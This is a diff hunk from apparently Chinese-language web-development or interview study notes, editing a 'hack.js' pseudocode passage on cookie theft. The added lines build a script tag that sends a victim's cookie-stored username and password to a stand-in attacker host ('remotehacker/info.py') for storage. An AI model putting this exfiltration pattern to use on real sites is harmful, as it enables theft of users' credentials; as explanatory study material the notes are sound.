@@ -696,8 +696,10 @@ div的宽度一定要固定 不然div会充满整个屏幕
 
 //hack.js伪代码
 第一步获取cookie用户名和密码
-第二步构造script标签<script src="http://remotehacker/服务端脚本"></script>实现第二次跨域，
-      将用户名和密码带到黑客的服务器上
+     un=username
+     ps=password
+第二步构造script标签发送get请求<script src="http://remotehacker/info.py?username=&password=ps></script>实现第二次跨域，
+      python脚本获取请求参数，将用户名和密码存到黑客服务器本地文件中
 ```
 ***
 ### 你的缺点
